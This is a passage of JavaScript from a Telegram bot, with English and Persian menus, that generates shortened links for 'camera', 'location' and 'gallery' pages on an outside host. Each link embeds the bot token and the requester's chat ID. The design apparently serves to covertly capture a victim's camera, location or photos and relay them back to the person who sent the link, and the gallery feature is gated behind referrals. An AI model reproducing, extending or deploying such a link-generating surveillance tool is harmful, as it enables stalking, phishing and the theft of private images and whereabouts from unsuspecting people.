        user.adminState = 'awaiting_location_link';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId);
      }

      else if (callbackData === 'menu_gallery') {
        await bot.telegram.deleteMessage(chatId, messageId);
        const requiredReferrals = 3;
        const userReferrals = user.referralCount || 0;
        if (user.isVip || userReferrals >= requiredReferrals) {
          await bot.telegram.sendPhoto(chatId, 'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg', {
            caption: messages[lang].galleryMessage,
            parse_mode: 'Markdown',
            reply_markup: createLinkKeyboard(lang).reply_markup,
          });
          user.adminState = 'awaiting_gallery_link';
          await user.save();
        } else {
          const botLink = `https://t.me/${botInfo.username}?start=${userId}`;
          await bot.telegram.sendPhoto(chatId, 'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg', {
            caption: messages[lang].galleryLocked(userReferrals, botLink),
            parse_mode: 'Markdown',
            reply_markup: createLinkKeyboard(lang).reply_markup,
          });
        }
        await bot.telegram.answerCbQuery(callbackQueryId);
      }

      else if (callbackData === 'create_link') {
        if (user.adminState === 'awaiting_camera_link') {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encodedBot = encodeBase64(botToken, true);
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/t/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl, chatId, 'camera');
          await bot.telegram.sendMessage(chatId, messages[lang].cameraLinkMessage(shortUrl), {
            parse_mode: 'Markdown',
            reply_markup: {
              keyboard: [
                [{ text: messages[lang].mainMenu }],
              ],
              resize_keyboard: true,
              one_time_keyboard: true,
            },
          });
          user.adminState = 'none';
          await user.save();
        } else if (user.adminState === 'awaiting_location_link') {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encodedBot = encodeBase64(botToken, true);
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/2/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl, chatId, 'location');
          await bot.telegram.sendMessage(chatId, messages[lang].locationLinkMessage(shortUrl), {
            parse_mode: 'Markdown',
            reply_markup: {
              keyboard: [
                [{ text: messages[lang].mainMenu }],
              ],
              resize_keyboard: true,
              one_time_keyboard: true,
            },
          });
          user.adminState = 'none';
          await user.save();
        } else if (user.adminState === 'awaiting_gallery_link') {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encodedBot = encodeBase64(botToken, true);
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/helps/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl, chatId, 'gallery');
          await bot.telegram.sendMessage(chatId, messages[lang].galleryLinkMessage(shortUrl), {
            parse_mode: 'Markdown',
            reply_markup: {
              keyboard: [
                [{ text: messages[lang].mainMenu }],
              ],
              resize_keyboard: true,
              one_time_keyboard: true,
            },
          });
          user.adminState = 'none';
          await user.save();
        }
        await bot.telegram.answerCbQuery(callbackQueryId);
      }

      else if (callbackData === 'menu_language') {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, {
          reply_markup: {
            inline_keyboard: [
              [
                { text: messages[lang].langEnglish, callback_data: 'lang_en_menu' },
                { text: messages[lang].langPersian, callback_data: 'lang_fa_menu' },
              ],
            ],
          },
        });
        await bot.telegram.answerCbQuery(callbackQueryId);
      }
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Error in bot:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};